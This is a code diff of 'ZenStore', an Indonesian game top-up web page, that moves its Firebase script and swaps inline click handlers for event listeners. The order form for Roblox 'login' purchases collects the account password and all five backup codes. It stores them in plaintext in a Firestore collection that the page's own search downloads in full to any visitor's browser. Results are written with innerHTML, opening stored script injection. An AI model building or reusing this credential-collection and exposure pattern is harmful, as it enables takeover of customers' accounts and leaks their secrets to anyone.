@@ -6,231 +6,6 @@
     <title>ZenStore - Top Up Game & Digital</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Oswald:wght@600;700&display=swap" rel="stylesheet">
     
-    <!-- SDK Firebase Online -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyAfJWdd7oM17foLNMRoK2k",
-            authDomain: "zenstore-3f8ef.firebaseapp.com",
-            projectId: "zenstore-3f8ef",
-            storageBucket: "zenstore-3f8ef.appspot.com",
-            messagingSenderId: "487720475687",
-            appId: "1:487720475687:web:dae597df0",
-            measurementId: "G-RYTR9057M9"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        window.selectedItemName = "";
-        window.selectedItemPrice = "";
-        window.selectedType = "standard"; 
-        window.searchMode = "user";
-
-        window.selectProduct = function(name, price, type, element) {
-            window.selectedItemName = name;
-            window.selectedItemPrice = price;
-            window.selectedType = type;
-
-            document.querySelectorAll('.option-card').forEach(card => card.classList.remove('selected'));
-            element.classList.add('selected');
-
-            document.getElementById('preview-box').innerHTML = `<strong>${name}</strong> — <span style="color:#00f2fe">Rp ${price}</span>`;
-
-            const stdBox = document.getElementById('standard-form-box');
-            const gpBox = document.getElementById('roblox-gamepass-box');
-            const rbxBox = document.getElementById('roblox-login-box');
-
-            stdBox.style.display = 'none';
-            gpBox.style.display = 'none';
-            rbxBox.style.display = 'none';
-
-            if(type === 'gamepass') {
-                gpBox.style.display = 'block';
-            } else if(type === 'login') {
-                rbxBox.style.display = 'block';
-            } else {
-                stdBox.style.display = 'block';
-            }
-        };
-
-        // FUNGSI BUAT PESANAN
-        window.sendOrderToAdminWeb = async function() {
-            const paymentType = document.getElementById('payment-select').value;
-
-            if(!window.selectedItemName) {
-                alert("Harap pilih salah satu produk terlebih dahulu!");
-                return;
-            }
-
-            let finalUserData = "";
-
-            if(window.selectedType === 'login') {
-                const username = document.getElementById('rbx-username').value.trim();
-                const password = document.getElementById('rbx-password').value.trim();
-                const phone = document.getElementById('rbx-phone-login').value.trim();
-                const email = document.getElementById('rbx-email').value.trim();
-
-                const code1 = document.getElementById('rbx-code-1').value.trim();
-                const code2 = document.getElementById('rbx-code-2').value.trim();
-                const code3 = document.getElementById('rbx-code-3').value.trim();
-                const code4 = document.getElementById('rbx-code-4').value.trim();
-                const code5 = document.getElementById('rbx-code-5').value.trim();
-
-                if(!username || !password) {
-                    alert("Harap isi Username dan Password Roblox!");
-                    return;
-                }
-
-                if(!code1 || !code2 || !code3 || !code4 || !code5) {
-                    alert("Harap lengkapi ke-5 Kode Backup Roblox!");
-                    return;
-                }
-
-                finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
-            } else if(window.selectedType === 'gamepass') {
-                const username = document.getElementById('gp-username').value.trim();
-                const phone = document.getElementById('gp-phone').value.trim();
-
-                if(!username || !phone) {
-                    alert("Harap isi Username Roblox dan No. WhatsApp!");
-                    return;
-                }
-
-                finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
-            } else {
-                const standardUser = document.getElementById('user-data-standard').value.trim();
-                if(!standardUser) {
-                    alert("Harap masukkan Username / User ID Game / No HP!");
-                    return;
-                }
-                finalUserData = standardUser;
-            }
-
-            const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
-            const now = new Date().toLocaleString("id-ID");
-
-            try {
-                await setDoc(doc(db, "orders", randId), {
-                    invoiceId: randId,
-                    product: `${window.selectedItemName} (Rp ${window.selectedItemPrice})`,
-                    userData: finalUserData,
-                    paymentMethod: paymentType,
-                    status: "Menunggu Pembayaran",
-                    createdAt: now
-                });
-
-                document.getElementById('inv-id').innerText = "#" + randId;
-                document.getElementById('inv-item').innerText = `${window.selectedItemName} (Rp ${window.selectedItemPrice})`;
-                document.getElementById('inv-user').innerText = finalUserData;
-                document.getElementById('inv-pay').innerText = paymentType;
-
-                document.getElementById('invoice-modal').style.display = "flex";
-            } catch (e) {
-                alert("Gagal terhubung ke database. Error: " + e.message);
-            }
-        };
-
-        // FUNGSI CEK STATUS PESANAN
-        window.searchOrder = async function() {
-            const searchInput = document.getElementById("search-input-val").value.trim();
-            const resultBox = document.getElementById("search-result-content");
-
-            if (!searchInput) {
-                alert("Harap masukkan kata kunci pencarian!");
-                return;
-            }
-
-            resultBox.innerHTML = "<p style='color:#00f2fe;'>🔍 Sedang mencari data pesanan...</p>";
-
-            try {
-                const ordersRef = collection(db, "orders");
-                let foundDocs = [];
-
-                if (window.searchMode === 'invoice') {
-                    let formattedQuery = searchInput.toUpperCase();
-                    if (!formattedQuery.startsWith("ZN-")) {
-                        formattedQuery = "ZN-" + formattedQuery;
-                    }
-
-                    const q = query(ordersRef, where("invoiceId", "==", formattedQuery));
-                    const querySnapshot = await getDocs(q);
-                    querySnapshot.forEach((docSnap) => foundDocs.push(docSnap.data()));
-                } else {
-                    const qAll = await getDocs(ordersRef);
-                    qAll.forEach((docSnap) => {
-                        const data = docSnap.data();
-                        if (data.userData && data.userData.toLowerCase().includes(searchInput.toLowerCase())) {
-                            foundDocs.push(data);
-                        }
-                    });
-                }
-
-                if (foundDocs.length === 0) {
-                    resultBox.innerHTML = `
-                        <div style="background:rgba(255,0,85,0.1); border:1px solid #ff0055; padding:12px; border-radius:8px; color:#ff0055;">
-                            ❌ Pesanan tidak ditemukan. Periksa kembali No. Invoice / User ID kamu!
-                        </div>
-                    `;
-                } else {
-                    let htmlResult = "";
-                    foundDocs.forEach(item => {
-                        const statusColor = item.status === "Selesai" ? "#25d366" : "#ffcc00";
-                        htmlResult += `
-                            <div style="background:#0f1117; border:1px solid #00f2fe; padding:12px; border-radius:10px; text-align:left; margin-bottom:10px;">
-                                <p style="font-size:12px; color:#aaa;">Invoice: <b style="color:#fff;">#${item.invoiceId}</b></p>
-                                <p style="font-size:12px; color:#aaa;">Produk: <b style="color:#00f2fe;">${item.product}</b></p>
-                                <p style="font-size:12px; color:#aaa;">Waktu: <span style="color:#fff;">${item.createdAt || '-'}</span></p>
-                                <p style="font-size:12px; color:#aaa; margin-top:5px;">Status: <b style="color:${statusColor};">${item.status}</b></p>
-                            </div>
-                        `;
-                    });
-                    resultBox.innerHTML = htmlResult;
-                }
-            } catch (e) {
-                resultBox.innerHTML = `<p style='color:#ff0055;'>Gagal mencari pesanan: ${e.message}</p>`;
-            }
-        };
-
-        window.openCekPesanan = function() {
-            document.getElementById('cek-pesanan-modal').style.display = 'flex';
-        };
-
-        window.closeCekPesanan = function() {
-            document.getElementById('cek-pesanan-modal').style.display = 'none';
-            document.getElementById('search-result-content').innerHTML = '';
-        };
-
-        window.setSearchMode = function(mode) {
-            window.searchMode = mode;
-            const btnUser = document.getElementById('tab-search-user');
-            const btnInv = document.getElementById('tab-search-invoice');
-            const inputField = document.getElementById('search-input-val');
-
-            if(mode === 'user') {
-                btnUser.classList.add('active');
-                btnInv.classList.remove('active');
-                inputField.placeholder = "Masukkan Username / User ID kamu...";
-            } else {
-                btnInv.classList.add('active');
-                btnUser.classList.remove('active');
-                inputField.placeholder = "Masukkan Invoice ID (Contoh: ZN-123456)...";
-            }
-        };
-
-        window.switchTab = function(tabName, eventObj) {
-            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
-
-            document.getElementById('tab-' + tabName).classList.add('active');
-            if(eventObj && eventObj.currentTarget) {
-                eventObj.currentTarget.classList.add('active');
-            }
-        };
-    </script>
-
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
         body { background-color: #0f1117; color: #ffffff; min-height: 100vh; padding-bottom: 50px; }
@@ -267,10 +42,6 @@
 
         .hero h1 { font-family: 'Oswald', sans-serif; font-size: 28px; color: #00f2fe; margin-bottom: 4px; letter-spacing: 1px; text-transform: uppercase; }
         .hero p { font-size: 11px; color: #a0a5b5; margin-bottom: 12px; }
-
-        .hero-logos { display: flex; justify-content: center; align-items: center; gap: 10px; }
-        .hero-logo-item { width: 32px; height: 32px; background: rgba(255, 255, 255, 0.05); border-radius: 8px; display: flex; align-items: center; justify-content: center; padding: 6px; }
-        .hero-logo-item svg { width: 100%; height: 100%; }
 
         .container { padding: 0 5%; margin-top: 20px; }
 
@@ -341,7 +112,7 @@
     <header>
         <div class="header-left">
             <div class="logo">Zen<span>Store</span></div>
-            <button onclick="openCekPesanan()" class="btn-cek-header">🔍 Cek Pesanan</button>
+            <button id="btn-open-cek" class="btn-cek-header">🔍 Cek Pesanan</button>
         </div>
         <div class="header-right">
             <a href="https://wa.me/6285872562036" class="btn-wa-header" target="_blank">Admin WA</a>
@@ -352,21 +123,6 @@
     <div class="hero">
         <h1>ZENSTORE DIGITAL TOP UP</h1>
         <p>Pilih Produk & Bayar Otomatis • Fast 24 Jam</p>
-        
-        <div class="hero-logos">
-            <div class="hero-logo-item">
-                <svg viewBox="0 0 24 24" fill="#00f2fe"><path d="M5.164 0L0 18.836 18.836 24 24 5.164 5.164 0zm9.337 13.784l-4.522-1.212 1.212-4.522 4.522 1.212-1.212 4.522z"/></svg>
-            </div>
-            <div class="hero-logo-item">
-                <svg viewBox="0 0 24 24" fill="#1DB954"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.48.66.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141 C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.18-.1.2-.84-.36-.18-.6.36-1.2.96-1.38 4.26-1.26 11.28-1.02 15.72 1.62.54.3.72 1.02.42 1.56-.3.42-1.02.6-1.56.3z"/></svg>
-            </div>
-            <div class="hero-logo-item">
-                <svg viewBox="0 0 24 24" fill="#E50914"><path d="M5.398 0v24h4.156l.006-11.838 5.044 11.838h4.017V0h-4.148l-.008 11.84L9.419 0H5.398z"/></svg>
-            </div>
-            <div class="hero-logo-item">
-                <svg viewBox="0 0 24 24" fill="#FF0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-            </div>
-        </div>
     </div>
 
     <div class="container">
@@ -401,7 +157,7 @@
                 </div>
             </div>
 
-            <div class="section-title">Nominal Diamond MLBB 💎 (Kecil - Besar)</div>
+            <div class="section-title">Nominal Diamond MLBB 💎</div>
             <div class="grid-options">
                 <div class="option-card" onclick="selectProduct('5 Diamonds MLBB', '1.500', 'standard', this)"><div class="option-name">5 Diamonds</div><div class="option-price">Rp 1.500</div></div>
                 <div class="option-card" onclick="selectProduct('12 Diamonds MLBB', '3.800', 'standard', this)"><div class="option-name">12 Diamonds</div><div class="option-price">Rp 3.800</div></div>
@@ -418,7 +174,7 @@
 
         <!-- TAB 2: ROBLOX -->
         <div id="tab-roblox" class="tab-content">
-            <div class="section-title">Robux Via Gamepass 🎮 (Kecil - Besar)</div>
+            <div class="section-title">Robux Via Gamepass 🎮</div>
             <div class="grid-options">
                 <div class="option-card" onclick="selectProduct('80 Robux Via Gamepass', '12.000', 'gamepass', this)"><div class="option-name">80 Robux Gamepass</div><div class="option-price">Rp 12.000</div></div>
                 <div class="option-card" onclick="selectProduct('100 Robux Via Gamepass', '15.000', 'gamepass', this)"><div class="option-name">100 Robux Gamepass</div><div class="option-price">Rp 15.000</div></div>
@@ -498,7 +254,7 @@
             </div>
         </div>
 
-        <!-- FORM PEMESANAN DYNAMIC -->
+        <!-- FORM PEMESANAN -->
         <div class="order-box">
             <div class="section-title" style="margin-bottom:10px; border:none; padding:0;">🛒 Form Pemesanan</div>
             
@@ -564,7 +320,7 @@
                 <option value="Bank BCA (1234567890)">Bank BCA (1234567890)</option>
             </select>
 
-            <button onclick="sendOrderToAdminWeb()" class="btn-pay-web">Bayar Sekarang</button>
+            <button id="btn-pay" class="btn-pay-web">Bayar Sekarang</button>
         </div>
 
     </div>
@@ -581,11 +337,11 @@
             </div>
 
             <input type="text" id="search-input-val" class="search-input-field" placeholder="Masukkan Username / User ID kamu...">
-            <button onclick="searchOrder()" class="btn-pay-web" style="margin-top:0;">Cek Pesananku</button>
+            <button id="btn-search-exec" class="btn-pay-web" style="margin-top:0;">Cek Pesananku</button>
 
             <div id="search-result-content" style="margin-top:15px;"></div>
 
-            <p onclick="closeCekPesanan()" style="margin-top:15px; font-size:12px; color:#aaa; cursor:pointer;">Tutup</p>
+            <p id="btn-close-cek" style="margin-top:15px; font-size:12px; color:#aaa; cursor:pointer;">Tutup</p>
         </div>
     </div>
 
@@ -603,8 +359,235 @@
             </div>
 
             <p style="font-size:11px; color:#00f2fe;">Silakan selesaikan pembayaran. Admin akan memproses pesananmu langsung dari web!</p>
-            <button onclick="document.getElementById('invoice-modal').style.display='none'" class="btn-pay-web" style="margin-top:15px;">Selesai</button>
+            <button id="btn-close-invoice" class="btn-pay-web" style="margin-top:15px;">Selesai</button>
         </div>
     </div>
+
+    <!-- SDK Firebase & Script Utama -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAfJWdd7oM17foLNMRoK2k",
+            authDomain: "zenstore-3f8ef.firebaseapp.com",
+            projectId: "zenstore-3f8ef",
+            storageBucket: "zenstore-3f8ef.appspot.com",
+            messagingSenderId: "487720475687",
+            appId: "1:487720475687:web:dae597df0",
+            measurementId: "G-RYTR9057M9"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let selectedItemName = "";
+        let selectedItemPrice = "";
+        let selectedType = "standard"; 
+        let searchMode = "user";
+
+        window.selectProduct = function(name, price, type, element) {
+            selectedItemName = name;
+            selectedItemPrice = price;
+            selectedType = type;
+
+            document.querySelectorAll('.option-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+
+            document.getElementById('preview-box').innerHTML = `<strong>${name}</strong> — <span style="color:#00f2fe">Rp ${price}</span>`;
+
+            const stdBox = document.getElementById('standard-form-box');
+            const gpBox = document.getElementById('roblox-gamepass-box');
+            const rbxBox = document.getElementById('roblox-login-box');
+
+            stdBox.style.display = 'none';
+            gpBox.style.display = 'none';
+            rbxBox.style.display = 'none';
+
+            if(type === 'gamepass') {
+                gpBox.style.display = 'block';
+            } else if(type === 'login') {
+                rbxBox.style.display = 'block';
+            } else {
+                stdBox.style.display = 'block';
+            }
+        };
+
+        window.switchTab = function(tabName, eventObj) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+
+            document.getElementById('tab-' + tabName).classList.add('active');
+            if(eventObj && eventObj.currentTarget) {
+                eventObj.currentTarget.classList.add('active');
+            }
+        };
+
+        window.setSearchMode = function(mode) {
+            searchMode = mode;
+            const btnUser = document.getElementById('tab-search-user');
+            const btnInv = document.getElementById('tab-search-invoice');
+            const inputField = document.getElementById('search-input-val');
+
+            if(mode === 'user') {
+                btnUser.classList.add('active');
+                btnInv.classList.remove('active');
+                inputField.placeholder = "Masukkan Username / User ID kamu...";
+            } else {
+                btnInv.classList.add('active');
+                btnUser.classList.remove('active');
+                inputField.placeholder = "Masukkan Invoice ID (Contoh: ZN-123456)...";
+            }
+        };
+
+        // EVENT LISTENER TOMBOL UTAMA (DIJAMIN AKTIF)
+        document.getElementById('btn-pay').addEventListener('click', async function() {
+            const paymentType = document.getElementById('payment-select').value;
+
+            if(!selectedItemName) {
+                alert("Harap pilih salah satu produk terlebih dahulu di atas!");
+                return;
+            }
+
+            let finalUserData = "";
+
+            if(selectedType === 'login') {
+                const username = document.getElementById('rbx-username').value.trim();
+                const password = document.getElementById('rbx-password').value.trim();
+                const phone = document.getElementById('rbx-phone-login').value.trim();
+                const email = document.getElementById('rbx-email').value.trim();
+
+                const code1 = document.getElementById('rbx-code-1').value.trim();
+                const code2 = document.getElementById('rbx-code-2').value.trim();
+                const code3 = document.getElementById('rbx-code-3').value.trim();
+                const code4 = document.getElementById('rbx-code-4').value.trim();
+                const code5 = document.getElementById('rbx-code-5').value.trim();
+
+                if(!username || !password) {
+                    alert("Harap isi Username dan Password Roblox!");
+                    return;
+                }
+                if(!code1 || !code2 || !code3 || !code4 || !code5) {
+                    alert("Harap lengkapi ke-5 Kode Backup Roblox!");
+                    return;
+                }
+
+                finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
+            } else if(selectedType === 'gamepass') {
+                const username = document.getElementById('gp-username').value.trim();
+                const phone = document.getElementById('gp-phone').value.trim();
+
+                if(!username || !phone) {
+                    alert("Harap isi Username Roblox dan No. WhatsApp!");
+                    return;
+                }
+
+                finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
+            } else {
+                const standardUser = document.getElementById('user-data-standard').value.trim();
+                if(!standardUser) {
+                    alert("Harap masukkan Username / User ID Game / No HP!");
+                    return;
+                }
+                finalUserData = standardUser;
+            }
+
+            const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date().toLocaleString("id-ID");
+
+            try {
+                await setDoc(doc(db, "orders", randId), {
+                    invoiceId: randId,
+                    product: `${selectedItemName} (Rp ${selectedItemPrice})`,
+                    userData: finalUserData,
+                    paymentMethod: paymentType,
+                    status: "Menunggu Pembayaran",
+                    createdAt: now
+                });
+
+                document.getElementById('inv-id').innerText = "#" + randId;
+                document.getElementById('inv-item').innerText = `${selectedItemName} (Rp ${selectedItemPrice})`;
+                document.getElementById('inv-user').innerText = finalUserData;
+                document.getElementById('inv-pay').innerText = paymentType;
+
+                document.getElementById('invoice-modal').style.display = "flex";
+            } catch (e) {
+                alert("Gagal terhubung ke database. Error: " + e.message);
+            }
+        });
+
+        // MODAL CEK PESANAN
+        document.getElementById('btn-open-cek').addEventListener('click', () => {
+            document.getElementById('cek-pesanan-modal').style.display = 'flex';
+        });
+        document.getElementById('btn-close-cek').addEventListener('click', () => {
+            document.getElementById('cek-pesanan-modal').style.display = 'none';
+            document.getElementById('search-result-content').innerHTML = '';
+        });
+        document.getElementById('btn-close-invoice').addEventListener('click', () => {
+            document.getElementById('invoice-modal').style.display = 'none';
+        });
+
+        // FUNGSI PENCARIAN
+        document.getElementById('btn-search-exec').addEventListener('click', async function() {
+            const searchInput = document.getElementById("search-input-val").value.trim();
+            const resultBox = document.getElementById("search-result-content");
+
+            if (!searchInput) {
+                alert("Harap masukkan kata kunci pencarian!");
+                return;
+            }
+
+            resultBox.innerHTML = "<p style='color:#00f2fe;'>🔍 Sedang mencari data pesanan...</p>";
+
+            try {
+                const ordersRef = collection(db, "orders");
+                let foundDocs = [];
+
+                if (searchMode === 'invoice') {
+                    let formattedQuery = searchInput.toUpperCase();
+                    if (!formattedQuery.startsWith("ZN-")) {
+                        formattedQuery = "ZN-" + formattedQuery;
+                    }
+
+                    const q = query(ordersRef, where("invoiceId", "==", formattedQuery));
+                    const querySnapshot = await getDocs(q);
+                    querySnapshot.forEach((docSnap) => foundDocs.push(docSnap.data()));
+                } else {
+                    const qAll = await getDocs(ordersRef);
+                    qAll.forEach((docSnap) => {
+                        const data = docSnap.data();
+                        if (data.userData && data.userData.toLowerCase().includes(searchInput.toLowerCase())) {
+                            foundDocs.push(data);
+                        }
+                    });
+                }
+
+                if (foundDocs.length === 0) {
+                    resultBox.innerHTML = `
+                        <div style="background:rgba(255,0,85,0.1); border:1px solid #ff0055; padding:12px; border-radius:8px; color:#ff0055;">
+                            ❌ Pesanan tidak ditemukan. Periksa kembali No. Invoice / User ID kamu!
+                        </div>
+                    `;
+                } else {
+                    let htmlResult = "";
+                    foundDocs.forEach(item => {
+                        const statusColor = item.status === "Selesai" ? "#25d366" : "#ffcc00";
+                        htmlResult += `
+                            <div style="background:#0f1117; border:1px solid #00f2fe; padding:12px; border-radius:10px; text-align:left; margin-bottom:10px;">
+                                <p style="font-size:12px; color:#aaa;">Invoice: <b style="color:#fff;">#${item.invoiceId}</b></p>
+                                <p style="font-size:12px; color:#aaa;">Produk: <b style="color:#00f2fe;">${item.product}</b></p>
+                                <p style="font-size:12px; color:#aaa;">Waktu: <span style="color:#fff;">${item.createdAt || '-'}</span></p>
+                                <p style="font-size:12px; color:#aaa; margin-top:5px;">Status: <b style="color:${statusColor};">${item.status}</b></p>
+                            </div>
+                        `;
+                    });
+                    resultBox.innerHTML = htmlResult;
+                }
+            } catch (e) {
+                resultBox.innerHTML = `<p style='color:#ff0055;'>Gagal mencari pesanan: ${e.message}</p>`;
+            }
+        });
+    </script>
 </body>
 </html>
